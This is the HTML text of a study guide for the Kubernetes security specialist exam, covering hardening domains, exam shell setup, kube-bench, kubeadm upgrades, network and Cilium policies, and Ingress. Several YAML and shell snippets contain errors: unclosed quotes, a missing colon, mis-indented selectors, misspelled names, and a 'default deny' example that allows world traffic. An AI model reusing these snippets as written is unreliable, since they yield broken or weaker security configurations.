<li><a href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/">Kubernetes Documentation &gt; Reference &gt; API Access Control &gt; Using RBAC Authorization</a></li>
</ul>
</li>
<li>
<p>Exercise caution in using service accounts e.g. disable defaults, minimize permissions on newly created ones</p>
<ul>
<li><a href="https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/">Kubernetes Documentation &gt; Reference &gt; API Access Control &gt; Managing Service Accounts</a></li>
</ul>
</li>
<li>
<p>Update Kubernetes frequently</p>
<ul>
<li><a href="https://kubernetes.io/docs/tasks/administer-cluster/cluster-upgrade/">Kubernetes Documentation &gt; Tasks &gt; Administer a Cluster &gt; Upgrade A Cluster</a></li>
</ul>
</li>
</ul>
<h3 id="system-hardening-15"><a class="header" href="#system-hardening-15">System Hardening (15%)</a></h3>
<ul>
<li>
<p>Minimize host OS footprint (reduce attack surface)</p>
<ul>
<li>Remove unnecessary packages</li>
<li>Identify and address open ports</li>
<li>Shut down any unnecessary services</li>
</ul>
</li>
<li>
<p>Minimize IAM roles</p>
<ul>
<li><a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html">AWS &gt; Security best practices in IAM</a></li>
<li><a href="https://cloud.google.com/iam/docs/using-iam-securely">GCP - Using IAM securely</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices">Azure &gt; Best practices for Azure RBAC</a></li>
</ul>
</li>
<li>
<p>Minimize external access to the network</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/services-networking/network-policies/">Kubernetes Documentation &gt; Concepts &gt; Services, Load Balancing, and Networking &gt; Network Policies</a></li>
</ul>
</li>
<li>
<p>Appropriately use kernel hardening tools such as AppArmor, seccomp</p>
<ul>
<li><a href="https://kubernetes.io/docs/tutorials/security/apparmor/">Kubernetes Documentation &gt; Tutorials &gt; Security &gt; Restrict a Container‚Äôs Access to Resources with AppArmor</a></li>
<li><a href="https://kubernetes.io/docs/tutorials/security/seccomp/">Kubernetes Documentation &gt; Tutorials &gt; Security &gt; Restrict a Container‚Äôs Syscalls with seccomp</a></li>
<li><a href="https://gitlab.com/apparmor/apparmor/-/wikis/Documentation">AppArmor Documentation</a></li>
</ul>
</li>
</ul>
<h3 id="minimize-microservice-vulnerabilities-20"><a class="header" href="#minimize-microservice-vulnerabilities-20">Minimize Microservice Vulnerabilities (20%)</a></h3>
<ul>
<li>
<p>Setup appropriate OS level security domains e.g. using PSP, OPA, security contexts</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/security/pod-security-policy/#what-is-a-pod-security-policy">Kubernetes Documentation &gt; Concepts &gt; Security &gt; Pod Security Policies</a></li>
<li><a href="https://kubernetes.io/blog/2019/08/06/opa-gatekeeper-policy-and-governance-for-kubernetes/">Kubernetes Blog &gt; OPA Gatekeeper: Policy and Governance for Kubernetes</a></li>
<li><a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/">Kubernetes Documentation &gt; Tasks &gt; Configure Pods and &gt; Containers &gt; Configure a Security Context for a Pod or Container</a></li>
</ul>
</li>
<li>
<p>Manage kubernetes secrets</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/configuration/secret/">Kubernetes Documentation &gt; Concepts &gt; Configuration &gt; Secrets</a></li>
</ul>
</li>
<li>
<p>Use container runtime sandboxes in multi-tenant environments (e.g. gvisor, kata containers</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/security/pod-security-standards/#what-about-sandboxed-pods">Kubernetes Documentation &gt; Concepts &gt; Security &gt; Pod Security Standards</a></li>
<li><a href="https://kubernetes.io/docs/concepts/containers/runtime-class/">Kubernetes Documentation &gt; Concepts &gt; Containers &gt; Runtime Class</a></li>
<li><a href="https://gvisor.dev/docs/user_guide/quick_start/kubernetes/">gvisor</a></li>
<li><a href="https://katacontainers.io/">kata containers</a></li>
</ul>
</li>
<li>
<p>Implement pod to pod encryption by use of mTLS</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/services-networking/ingress/#tls">Kubernetes Documentation &gt; Concepts &gt; Services, Load Balancing, and Networking &gt; Ingress &gt; TLS</a></li>
</ul>
</li>
</ul>
<h3 id="supply-chain-security-20"><a class="header" href="#supply-chain-security-20">Supply Chain Security (20%)</a></h3>
<ul>
<li>
<p>Minimize base image footprint</p>
<ul>
<li>Remove exploitable and non-sssential software</li>
<li>Use multi-stage Dockerfiles to keep software compilation out of runtime images</li>
<li>Never bake any secrets into your images</li>
<li>Image scanning</li>
</ul>
</li>
<li>
<p>Secure your supply chain: whitelist allowed image registries, sign and validate images</p>
<ul>
<li><a href="https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#imagepolicywebhook">Kubernetes Documentation &gt; Reference &gt; API Access Control &gt; Using Admission Controllers &gt; ImagePolicyWebhook</a></li>
</ul>
</li>
<li>
<p>Use static analysis of user workloads (e.g. kubernetes resources, docker files)</p>
<ul>
<li>Secure base images</li>
<li>Remove unnecessary packages</li>
<li>Stop containers from using elevated privileges</li>
</ul>
</li>
<li>
<p>Scan images for known vulnerabilities</p>
<ul>
<li><a href="https://github.com/aquasecurity/trivy">Trivy</a></li>
</ul>
</li>
</ul>
<h3 id="monitoring-logging-and-runtime-security-20"><a class="header" href="#monitoring-logging-and-runtime-security-20">Monitoring, Logging and Runtime Security (20%)</a></h3>
<ul>
<li>
<p>Perform behavioral analytics of syscall process and file activities at the host and container level to detect malicious activities</p>
<ul>
<li><a href="https://falco.org/docs/">Falco</a></li>
</ul>
</li>
<li>
<p>Detect threats within physical infrastructure, apps, networks, data, users and workloads</p>
</li>
<li>
<p>Detect all phases of attack regardless where it occurs and how it spreads</p>
<ul>
<li><a href="https://cloud.redhat.com/blog/protecting-kubernetes-against-mitre-attck-initial-access">Protecting Kubernetes Against MITRE ATT&amp;CK</a></li>
</ul>
</li>
<li>
<p>Perform deep analytical investigation and identification of bad actors within environment</p>
<ul>
<li><a href="https://kubernetes.io/docs/tasks/debug-application-cluster/audit/">Kubernetes Documentation &gt; Tasks &gt; Monitoring, Logging, and Debugging &gt;Auditing</a></li>
</ul>
</li>
<li>
<p>Ensure immutability of containers at runtime</p>
<ul>
<li>
<p><a href="https://kubernetes.io/docs/concepts/containers/">Kubernetes Documentation &gt; Concepts &gt; Containers</a></p>
</li>
<li>
<p><a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/">Kubernetes Documentation &gt; Tasks &gt; Configure Pods and &gt; Containers &gt; Configure a Security Context for a Pod or Container</a></p>
<blockquote>
<p><code>readOnlyRootFilesystem</code>: Mounts the container‚Äôs root filesystem as read-only</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Use Audit Logs to monitor access</p>
<ul>
<li><a href="https://kubernetes.io/docs/tasks/debug-application-cluster/audit/">Kubernetes Documentation &gt; Tasks &gt; Monitoring, Logging, and Debugging &gt;Auditing</a></li>
</ul>
</li>
</ul>
<h3 id="changes"><a class="header" href="#changes">Changes</a></h3>
<ul>
<li>https://kodekloud.com/blog/cks-exam-updates-2024-your-complete-guide-to-certification-with-kodekloud/</li>
<li>https://training.linuxfoundation.org/cks-program-changes/</li>
</ul>
<h3 id="software--environment"><a class="header" href="#software--environment">Software / Environment</a></h3>
<blockquote>
<p>As of 11/2024</p>
</blockquote>
<ul>
<li>Kubernetes version: 1.31</li>
<li>Ubuntu 20.04</li>
<li>Terminal
<ul>
<li>Bash</li>
</ul>
</li>
<li>Tools available
<ul>
<li><code>vim</code> - Text/Code editor</li>
<li><code>tmux</code> - Terminal multiplexor</li>
<li><code>jq</code> - Working with JSON format</li>
<li><code>yq</code> - Working with YAML format</li>
<li><code>firefox</code> - Web Browser for accessing K8s docs</li>
<li><code>base64</code> - Tool to convert to and from base 64</li>
<li><code>kubectl</code> - Kubernetes CLI Client</li>
<li>more typical linux tools like <code>grep</code>, <code>wc</code> ‚Ä¶</li>
</ul>
</li>
<li>3rd Party Tools to know
<ul>
<li><code>tracee</code></li>
<li><code>OPA Gatekeeper</code></li>
<li><code>kubebench</code></li>
<li><code>syft</code></li>
<li><code>grype</code></li>
<li><code>kube-linter</code></li>
<li><code>kubesec</code></li>
<li><code>trivy</code></li>
<li><code>falco</code></li>
</ul>
</li>
</ul>
<h3 id="exam-environment-setup"><a class="header" href="#exam-environment-setup">Exam Environment Setup</a></h3>
<h4 id="terminal-shortcutsaliases"><a class="header" href="#terminal-shortcutsaliases">Terminal Shortcuts/Aliases</a></h4>
<p>The following are useful terminal shortcut aliases/shortcuts to use during the exam.</p>
<p>Add the following to the end of <code>~/.bashrc</code> file:</p>
<pre><code>alias k='kubectl # &lt;-- Most general and useful shortcut!

alias kd='kubectl delete --force --grace-period=0 # &lt;-- Fast deletion of resources

alias kc="kubectl create" # &lt;-- Create a resource
alias kc-dry='kubectl create --dry-run=client -o yaml # &lt;-- Create a YAML template of resource

alias kr='kubectl run' # &lt;-- Run/Create a resource (typically pod)
alias kr-dry='kubectl run --dry-run=client -o yaml # &lt;-- Create a YAML template of resource

# If kc-dry and kr-dry do not autocomplete, add the following

export do="dry-run=client -o yaml" # &lt;-- Create the YAML tamplate (usage: $do)
</code></pre>
<p>The following are some example usages:</p>
<pre><code>k get nodes -o wide
kc deploymentmy my-dep --image=nginx --replicas=3
kr-dry my-pod --image=nginx --command sleep 36000
kr-dry --image=busybox -- "/bin/sh" "-c" "sleep 36000"
kr --image=busybox -- "/bin/sh" "-c" "sleep 36000" $do
</code></pre>
<h4 id="terminal-command-completion"><a class="header" href="#terminal-command-completion">Terminal Command Completion</a></h4>
<p>The following is useful so that you can use the TAB key to auto-complete a command, allowing you to
not always have to remember the exact keyword or spelling.</p>
<p>Type the following into the terminal:</p>
<pre><code>- kubectl completion bash &gt;&gt; ~/.bashrc`-`kubectl` command completion
- kubeadm completion bash &gt;&gt; ~/.bashrc`-`kubeadm` command completion
- exec $SHELL` - Reload shell to enable all added completion
</code></pre>
<h4 id="vim"><a class="header" href="#vim">VIM</a></h4>
<p>The exam will have VIM or nano terminal text editor tools available. If you are using
VIM ensure that you create a <code>~/.vimrc</code> file and add the following:</p>
<pre><code>set ts=2 " &lt;-- tabstop - how many spaces is \t worth
set sw=2 " &lt;-- shiftwidth - how many spaces is indentation
set et " &lt;-- expandtab - Use spaces, never \t values
set mouse=a " &lt;-- Enable mouse support
</code></pre>
<p>Or simply:</p>
<pre><code>set ts=2 sw=2 et mouse=a
</code></pre>
<p>Also know VIM basics are as follows. Maybe a good idea to take a quick VIM course.</p>
<ul>
<li><code>vim my-file.yaml</code> - If file exists, open it, else create it for editing</li>
<li><code>:w</code> - Save</li>
<li><code>:x</code> - Save and exit</li>
<li><code>:q</code> - Exit</li>
<li><code>:q!</code> - Exit without saving</li>
<li><code>i</code> - Insert mode, regular text editor mode</li>
<li><code>v</code> - Visual mode for selection</li>
<li><code>ESC</code> - Normal mode</li>
</ul>
<h4 id="pasting-text-into-vim"><a class="header" href="#pasting-text-into-vim">Pasting Text Into VIM</a></h4>
<p>Often times you will want to paste text or code from the Kubernetes documentation into
into a VIM terminal. If you simply do that, the tabs will do funky things.</p>
<p>Do the following inside VIM before pasting your copied text:</p>
<ol>
<li>In NORMAL mode, type <code>:set paste</code></li>
<li>Now enter <code>INSERT</code> mode</li>
</ol>
<ul>
<li>You should see ‚Äì <code>INSERT (paste) --</code> at the bottom of the screen</li>
</ul>
<ol start="3">
<li>Paste the text</li>
</ol>
<ul>
<li>You can right click with mouse and select Paste or <code>CTRL + SHIFT + v</code></li>
</ul>
<h4 id="tmux"><a class="header" href="#tmux">tmux</a></h4>
<p><code>tmux</code> will allow you to use multiple terminal windows in one (aka terminal multiplexing).
Make sure you know the basics for tmux usage:</p>
<ul>
<li><code>tmux</code>- Turn and enter<code>tmux</code></li>
<li><code>CTRL + b "</code> - Split the window vertically (line is horizontal)</li>
<li><code>CTRL + b %</code> - Split the window horizontally (line is vertical)</li>
<li><code>CTRL + b &lt;ARROW KEY&gt;</code> - Switch between window panes</li>
<li><code>CTRL + b (hold) &lt;ARROW KEY&gt;</code> - Resize current window pane</li>
<li><code>CTRL + b z</code> - Toggle full terminal/screen a pane (good for looking at a full document)</li>
<li><code>CTRL + d</code>or<code>exit</code> - Close a window pane</li>
</ul>
<h4 id="mouse-support"><a class="header" href="#mouse-support">Mouse Support</a></h4>
<p>If you want to be able to click and select within tmux and tmux panes, you can also enable
mouse support. This can be useful.</p>
<p>These steps must be done outside of tmux`</p>
<ol>
<li>
<p>Create a <code>.tmux.conf</code> file and edit it</p>
<ul>
<li><code>vim ~/.tmux.conf</code></li>
</ul>
</li>
<li>
<p>Add the configuration, save, and exit file</p>
<ul>
<li><code>set -g mouse on</code></li>
</ul>
</li>
<li>
<p>Reload tmux configuration</p>
<ul>
<li><code>tmux source .tmux.conf</code></li>
</ul>
</li>
</ol>
<h1 id="preparation"><a class="header" href="#preparation">Preparation</a></h1>
<h3 id="study-resources"><a class="header" href="#study-resources">Study Resources</a></h3>
<ul>
<li><a href="https://kubernetes.io/docs/home/">Official Kubernetes Documentation</a></li>
<li><a href="https://learn.kodekloud.com/user/courses/certified-kubernetes-security-specialist-cks">KodeKloud CKS Course</a></li>
<li><a href="https://www.amazon.com/Kubernetes-Book-Nigel-Poulton/dp/1521823634">The Kubernetes Book - Nigel Poulton</a></li>
<li><a href="https://www.amazon.com/Certified-Kubernetes-Security-Specialist-Depth/dp/1098132971">CKS Study Guide</a></li>
<li><a href="https://killer.sh/">killer.sh</a> labs</li>
</ul>
<h3 id="practice"><a class="header" href="#practice">Practice</a></h3>
<ul>
<li><a href="https://labs.play-with-k8s.com/">Play with Kubernetes</a></li>
<li><a href="https://killer.sh/cks">killer.sh Practice questions and environment</a></li>
</ul>
<h1 id="fundamentals"><a class="header" href="#fundamentals">Fundamentals</a></h1>
<ul>
<li>You should already have CKA level knowledge</li>
<li>Linux Kernel Namespaces isolate containers
<ul>
<li>PID Namespace: Isolates processes</li>
<li>Mount Namespace: Restricts access to mounts or root filesystem</li>
<li>Network Namespace: Only access certain network devices. Firewall and routing rules</li>
<li>User Namespace: Different set of UIDs are used. Example: User (UID 0) inside one namespace can be different from user(UID 0) inside another namespace</li>
</ul>
</li>
<li>cgroups restrict resource usage of processes
<ul>
<li>RAM/Disk/CPU</li>
</ul>
</li>
<li>Using cgroups and linux kernel namespaces, we can create containers</li>
</ul>
<h1 id="understand-the-kubernetes-attack-surface"><a class="header" href="#understand-the-kubernetes-attack-surface">Understand the Kubernetes Attack Surface</a></h1>
<ul>
<li>Kubernetes is a complex system with many components. Each component has its own vulnerabilities and attack vectors.</li>
<li>The attack surface can be reduced by:
<ul>
<li>Using network policies to restrict traffic between pods</li>
<li>Using RBAC to restrict access to the kube-api server</li>
<li>Using admission controllers to enforce security policies</li>
<li>Using pod security standards to enforce security policies</li>
<li>Using best practices to secure the underlying infrastructure</li>
<li>Using securityContext to enforce security policies for pods</li>
</ul>
</li>
</ul>
<h1 id="the-4-cs-of-cloud-native-security"><a class="header" href="#the-4-cs-of-cloud-native-security">The 4 C‚Äôs of Cloud-Native Security</a></h1>
<ul>
<li>Cloud: Security of the cloud infrastructure</li>
<li>Cluster: Security of the cluster itself</li>
<li>Container: Security of the containers themselves</li>
<li>Code: Security of the code itself</li>
</ul>
<h1 id="1-cluster-setup"><a class="header" href="#1-cluster-setup">1 Cluster Setup</a></h1>
<h2 id="cis-benchmark"><a class="header" href="#cis-benchmark">CIS Benchmark</a></h2>
<h3 id="what-is-a-security-benchmark"><a class="header" href="#what-is-a-security-benchmark">What is a security benchmark?</a></h3>
<ul>
<li>A security benchmark is a set of standard benchmarks that define a state of optimized security for a given system (servers, network devices, etc.)</li>
<li>CIS (Center for Internet Security) provides standardized benchmarks (in the form of downloadable files) that one can use to implement security on their system.</li>
<li>CIS provides benchmarks for public clouds (Azure, AWS, GCP, etc.), operating systems (Linux, Windows, MacOS), network devices (Cisco, Juniper, HP, etc.), mobile devices (Android and Apple), desktop and server software (such as Kubernetes)</li>
<li>View more info <a href="https://www.cisecurity.org/cis-benchmarks">here</a></li>
<li>You must register at the CIS website to download benchmarks</li>
<li>Each benchmark provides a description of a vulnerability, as well as a path to resolution.</li>
<li>CIS-CAT is a tool you can run on a system to generate recommendations for a given system. There are two versions available for download, CIS-CAT Lite and CIS-CAT Pro. The Lite version only includes benchmarks for Windows 10, MacOS, Ubuntu, and desktop software (Google Chrome, etc.). The Pro version includes all benchmarks.</li>
<li>CIS Benchmarks for Kubernetes
<ul>
<li>Register at the CIS website and download the CIS Benchmarks for <a href="https://www.cisecurity.org/benchmark/kubernetes">kubernetes</a></li>
<li>Includes security benchmarks for master and worker nodes</li>
</ul>
</li>
</ul>
<h3 id="kubebench"><a class="header" href="#kubebench">KubeBench</a></h3>
<ul>
<li>KubeBench is an alternative to CIS-CAT Pro to run benchmarks against a Kubernetes cluster.</li>
<li>KubeBench is open source and maintained by Aqua Security</li>
<li>KubeBench can be deployed as a Docker container or a pod. It can also be invoked directly from the binaries or compiled from source.</li>
<li>Once run, kube-bench will scan the cluster to identify if best-practices have been implemented. If will output a report specifying which benchmarks have passed/failed. It will tell you how to fix any failed benchmarks.</li>
<li>You can view the report by tailing the pod logs of the kube-bench pod.</li>
</ul>
<h2 id="cluster-upgrades"><a class="header" href="#cluster-upgrades">Cluster Upgrades</a></h2>
<ul>
<li>The controller-manager and kube-scheduler can be one minor revision behind the API server.
<ul>
<li>For example, if the API server is at version 1.10, controller-manager and kube-scheduler can be at 1.9 or 1.10</li>
</ul>
</li>
<li>The kubelet and kube-proxy can be up to 2 minor revisions behind the API server</li>
<li>kubectl can be x+1 or x-1 minor revisions from the kube API server</li>
<li>You can upgrade the cluster one minor version at a time</li>
</ul>
<h3 id="upgrade-process"><a class="header" href="#upgrade-process">Upgrade Process</a></h3>
<ul>
<li>Drain and cordon the node before upgrading it
<ul>
<li><code>kubectl drain &lt;node name&gt; --ignore-daemonsets</code></li>
</ul>
</li>
<li>Upgrade the master node first.</li>
<li>Upgrade worker nodes after the master node.</li>
</ul>
<h3 id="upgrading-with-kubeadm"><a class="header" href="#upgrading-with-kubeadm">Upgrading with Kubeadm</a></h3>
<ul>
<li>If the cluster was created with kubeadm, you can use kubeadm to upgrade it.</li>
<li>The upgrade process with kubeadm:
<pre><code># Increase the minor version in the apt repository file for kubernetes:
  sudo vi /etc/apt/sources.list.d/kubernetes.list

# Determine which version to upgrade to
  sudo apt update
  sudo apt-cache madison kubeadm

# Upgrade kubeadm first
  sudo apt-mark unhold kubeadm &amp;&amp; \
  sudo apt-get update &amp;&amp; sudo apt-get install -y kubeadm='1.31.x-*' &amp;&amp; \
  sudo apt-mark hold kubeadm

# Verify the version of kubeadm
  kubeadm version

# Check the kubeadm upgrade plan
  sudo kubeadm upgrade plan

# Apply the upgrade plan
  sudo kubeadm upgrade apply v1.31.x

# Upgrade the nodes
  sudo kubeadm upgrade node

# Upgrade kubelet and kubectl
  sudo apt-mark unhold kubelet kubectl &amp;&amp; \
  sudo apt-get update &amp;&amp; sudo apt-get install -y kubelet='1.31.x-*' kubectl='1.31.x-*' &amp;&amp; \
  sudo apt-mark hold kubelet kubectl

# Restart the kubelet
  sudo systemctl daemon-reload
  sudo systemctl restart kubelet
</code></pre>
</li>
</ul>
<h2 id="network-policies"><a class="header" href="#network-policies">Network Policies</a></h2>
<h3 id="overview-9"><a class="header" href="#overview-9">Overview</a></h3>
<ul>
<li>
<p>Kubernetes Network Policies allow you to control the flow of traffic to and from pods. They define rules that specify:</p>
<ul>
<li>What traffic is allowed to reach a set of pods.</li>
<li>What traffic a set of pods can send out.</li>
</ul>
</li>
<li>
<p>Pods can communicate with each other by default. Network Policies allow you to restrict this communication.</p>
</li>
<li>
<p>Network Policies operate at Layer 3 and Layer 4 (IP and TCP/UDP). They do not cover Layer 7 (application layer).</p>
</li>
<li>
<p>Network Policies are additive. Meaning, to grant more permissions for network communication, simply create another network policy with more fine-grained rules.</p>
</li>
<li>
<p>Network Policies are implemented by the network plugin. The network plugin must support NetworkPolicy for the policies to take effect.</p>
</li>
<li>
<p>Network Policies are namespace-scoped. They apply to pods in the same namespace.</p>
<pre><code>apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: 
  name: default-deny-all
  namespace: secure-namespace
spec:
    podSelector: {}
    policyTypes
    - Ingress
</code></pre>
</li>
<li>
<p>Say we now want to grant the ‚Äòfrontend‚Äô pods with label ‚Äòteir: frontend‚Äô in the ‚Äòapp‚Äô namespace access to the ‚Äòbackend‚Äô pods in ‚Äòsecure-namespace‚Äô. We can do that by creating another Network Policy like this:</p>
<pre><code>apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-app-pods
  namespace: secure-namespace
spec:
    podSelector:
      matchLabels:
        tier: backend
    policyTypes:
    - Ingress
    ingress:
    - from:
      - namespaceSelector:
          matchLabels:
            name: app
        podSelector:
          matchLabels:
            teir: frontend
      ports:
      - protocol: TCP
        port: 3000

</code></pre>
</li>
</ul>
<h3 id="key-concepts-1"><a class="header" href="#key-concepts-1">Key Concepts</a></h3>
<ol>
<li><strong>Namespace Scope</strong>: Network policies are applied at the namespace level.</li>
<li><strong>Selector-Based Rules</strong>:
<ul>
<li><strong>Pod Selector</strong>: Select pods the policy applies to.</li>
<li><strong>Namespace Selector</strong>: Select pods based on their namespace.</li>
</ul>
</li>
<li><strong>Traffic Direction</strong>:
<ul>
<li><strong>Ingress</strong>: Traffic coming into the pod.</li>
<li><strong>Egress</strong>: Traffic leaving the pod.</li>
</ul>
</li>
<li><strong>Default Behavior</strong>:
<ul>
<li>Pods are non-isolated by default (accept all traffic).</li>
<li>A pod becomes isolated when a network policy matches it.</li>
</ul>
</li>
</ol>
<h3 id="common-fields-in-a-network-policy"><a class="header" href="#common-fields-in-a-network-policy">Common Fields in a Network Policy</a></h3>
<ul>
<li><strong><code>podSelector</code></strong>: Specifies the pods the policy applies to.</li>
<li><strong><code>ingress</code>/<code>egress</code></strong>: Lists rules for ingress or egress traffic.</li>
<li><strong><code>from</code>/<code>to</code></strong>: Specifies allowed sources/destinations (can use IP blocks, pod selectors, or namespace selectors).</li>
<li><strong><code>ports</code></strong>: Specifies allowed ports and protocols.</li>
</ul>
<h3 id="example-network-policies"><a class="header" href="#example-network-policies">Example Network Policies</a></h3>
<h4 id="allow-all-ingress-traffic"><a class="header" href="#allow-all-ingress-traffic">Allow All Ingress Traffic</a></h4>
<pre><code>````
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-all-ingress
  namespace: default
spec:
  podSelector: {}
  ingress:
  - {}
```
</code></pre>
<h4 id="deny-all-ingress-and-egress-traffic"><a class="header" href="#deny-all-ingress-and-egress-traffic">Deny All Ingress and Egress Traffic</a></h4>
<pre><code>````
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
    name: deny-all
    namespace: defaulT
spec:
    podSelector: {}
    ingress: []
    egress: []

```
</code></pre>
<h4 id="allow-specific-ingress-from-a-namespace"><a class="header" href="#allow-specific-ingress-from-a-namespace">Allow Specific Ingress from a Namespace</a></h4>
<pre><code>```
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
    name: allow-namespace-ingress
    namespace: default
spec:
    podSelector:
        matchLabels:
            app: my-app
    ingress:
    - from:
      - namespaceSelector:
        matchLabels:
        team: frontend
```
</code></pre>
<h4 id="allow-egress-to-a-specific-ip"><a class="header" href="#allow-egress-to-a-specific-ip">Allow Egress to a Specific IP</a></h4>
<pre><code>```
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
    name: allow-egress-specific-ip
    namespace: default
spec:
    podSelector:
        matchLabels:
            app: my-app
    egress:
    - to:
      - ipBlock:
        cidr: 192.168.1.0/24
        ports:
      - protocol: TCP
        port: 8080
```
</code></pre>
<h2 id="cilium-network-policy"><a class="header" href="#cilium-network-policy">Cilium Network Policy</a></h2>
<ul>
<li>Cilium Network Policies provide more granularity, flexibility, and features than traditional Kubernetes Network Policies</li>
<li>Cilium Network Policies operate up to layer 7 of the OSI model. Traditional Network Policies only operate up to layer 4.</li>
<li>Cilium Network Policies perform well due to the fact that they use eBPF</li>
<li>Hubble allows you to watch traffic going to and from pods</li>
<li>You can add Cilium to the cluster by:
<ul>
<li>Deploying with helm</li>
<li>Running <code>cilium install</code> after you install the cilium CLI tool</li>
</ul>
</li>
</ul>
<h3 id="cilium-network-policy-structure"><a class="header" href="#cilium-network-policy-structure">Cilium Network Policy Structure</a></h3>
<ul>
<li>Cilium Network Policies are defined in YAML files</li>
<li>The structure is similar to Kubernetes Network Policies</li>
</ul>
<h3 id="layer-3-rules"><a class="header" href="#layer-3-rules">Layer 3 Rules</a></h3>
<ul>
<li>Endpoints Based - Apply the policy to pods based on Kubernetes label selectors</li>
<li>Services Based - Apply the policy based on kubernetes services, controlling traffic based on service names rather than individual pods</li>
<li>Entities Based - Cilium has pre-defined entities like cluster, host, and world. This type of policy uses these entities to determine what traffic the policy is applied to.
<ul>
<li>Cluster - Represents all kubernetes endpoints
<ul>
<li>Example:
<pre><code>apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-egress-to-cluster-resources
spec:
  endpointSelector: {}
  egress:
  - toEntities:
    - cluster
</code></pre>
</li>
</ul>
</li>
<li>World - Represents any external traffic, but not cluster traffic
<pre><code>apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-egress-to-external-resources
spec:
  endpointSelector: {}
  egress:
  - toEntities:
    - world
</code></pre>
</li>
<li>Host - Represents the local kubernetes node</li>
<li>Remote-node - Represents traffic from a remote node</li>
<li>All - Represents all endpoints both internal and external to the cluster
<pre><code>apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-egress-to-external-resources
spec:
  endpointSelector: {}
  egress:
  - toEntities:
    - all
</code></pre>
</li>
</ul>
</li>
<li>Node Based - Apply the policy based on nodes in the cluster</li>
<li>IP/CIDR Based - Apply the policy based on IP addresses or CIDR blocks</li>
</ul>
<h3 id="layer-4-rules"><a class="header" href="#layer-4-rules">Layer 4 Rules</a></h3>
<ul>
<li>If no layer 4 rules are defined, all traffic is allowed for layer 4</li>
<li>Example:
<pre><code>  apiVersion: "cilium.io/v2"
  kind: CiliumNetworkPolicy
  metadata:
    name: allow-external-80
  spec:
    endpointSelector:
      matchLabels:
        run: curl
    egress:
      - toPorts:
        - ports:
          - port: "80"
            protocol: TCP
</code></pre>
</li>
</ul>
<h3 id="layer-7-rules"><a class="header" href="#layer-7-rules">Layer 7 Rules</a></h3>
<h3 id="deny-policies"><a class="header" href="#deny-policies">Deny Policies</a></h3>
<ul>
<li>You can create deny policies to explicitly block traffic</li>
<li>Deny policies take higher precedence over allow policies</li>
<li>ingressDeny Example:
<pre><code>apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: deny-ingress-80-for-backend
spec:
  endpointSelector:
    matchLabels:
      app: backend
  ingressDeny:
  - fromEntities:
    - all
  - toPorts:
    - ports:
      - port: "80"
        protocol: TCP
</code></pre>
</li>
<li>egressDeny Example:
<pre><code>apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: "deny-egress"
spec:
  endpointSelector:
    matchLabels:
      app: random-pod
  egress:
  - toEntities:
    - all
  egressDeny:
  - toEndpoints:
    - matchLabels:
        app: server
</code></pre>
</li>
</ul>
<h3 id="examples-5"><a class="header" href="#examples-5">Examples</a></h3>
<h4 id="default-deny-all"><a class="header" href="#default-deny-all">Default Deny All</a></h4>
<pre><code>apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: default-deny-all
spec:
  endpointSelector: {}
  ingress:
  - fromEntities:
    - world
</code></pre>
<h2 id="kubernetes-ingress"><a class="header" href="#kubernetes-ingress">Kubernetes Ingress</a></h2>
<h3 id="what-is-ingress"><a class="header" href="#what-is-ingress">What is Ingress?</a></h3>
<ul>
<li><strong>Ingress</strong> is an API object that manages external access to services in a Kubernetes cluster, typically HTTP and HTTPS.</li>
<li>Provides:
<ul>
<li><strong>Load balancing</strong></li>
<li><strong>SSL termination</strong></li>
<li><strong>Name-based virtual hosting</strong></li>
</ul>
</li>
</ul>
<h3 id="why-use-ingress"><a class="header" href="#why-use-ingress">Why Use Ingress?</a></h3>
<ul>
<li>To consolidate multiple service endpoints behind a single, externally accessible URL.</li>
<li>Reduce the need for creating individual LoadBalancers or NodePort services.</li>
</ul>
<h3 id="key-components-of-ingress"><a class="header" href="#key-components-of-ingress">Key Components of Ingress</a></h3>
<ol>
<li>
<p><strong>Ingress Controller</strong></p>
<ul>
<li>Software that watches for Ingress resources and implements the rules.</li>
<li>Popular Ingress controllers:
<ul>
<li><code>ingress-nginx</code></li>
<li><code>Traefik</code></li>
<li><code>HAProxy</code></li>
<li><code>Istio Gateway</code></li>
</ul>
</li>
<li>Must be installed separately in the cluster.</li>
</ul>
</li>
<li>
<p><strong>Ingress Resource</strong></p>
<ul>
<li>The Kubernetes object that defines how requests should be routed to services.</li>
</ul>
</li>
</ol>
<h3 id="ingress-resource-configuration"><a class="header" href="#ingress-resource-configuration">Ingress Resource Configuration</a></h3>
<ul>
<li>As of Kubernetes 1.20, you can create an ingress using kubectl:
<pre><code>kubectl create ingress  --rule="host/path=service:port"
</code></pre>
</li>
</ul>
<h3 id="basic-structure"><a class="header" href="#basic-structure">Basic Structure</a></h3>
<pre><code>```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: example-ingress
spec:
  rules:
    - host: example.com
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: example-service
                port:
                  number: 80
```
</code></pre>
